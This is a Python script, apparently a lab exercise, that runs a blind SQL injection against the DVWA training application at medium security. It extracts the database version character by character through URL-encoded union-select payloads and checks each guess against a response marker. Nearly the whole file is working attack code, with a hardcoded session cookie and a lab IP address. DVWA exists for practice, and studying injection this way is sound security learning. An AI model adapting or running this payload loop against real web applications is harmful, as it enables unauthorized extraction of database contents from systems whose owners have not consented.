import urllib.request
##
# DVWA Blind SQLi to get DB Version
# security >> medium
##
def blind_sql(base, cookies, ok):
    print("--Blind SQLi on progress--")
    version_data = ""
    col = 1
    iterate = list(range(32,127))
    while True:
        found = False
        for number in iterate:
            url = base + "?id=-1+union+select+null%2CASCII%28substring%28%40%40version%2C" + str(col) + \
                  "%2C1%29%29%3D" + str(number) + "%23&Submit=Submit#" 
            try:
                req = urllib.request.Request(url, headers={'Cookie': cookies})
                data = urllib.request.urlopen(req, timeout=5)
                response = str(data.read())
            except:
                pass
            if ok in response:
                version_data = version_data + chr(number)
                found = True
                break
        col = col + 1
        if not found:
            break
    return version_data

ok_search = "Surname: 1"
#Change your cookie
cookies = "security=medium; PHPSESSID=b7d44c1ab4ea6b0f2e6c8b7c80f5dd57"
#Change your IP
url_base = "http://192.168.206.133/dvwa/vulnerabilities/sqli_blind/"
print("Version: " + blind_sql(url_base, cookies, ok_search))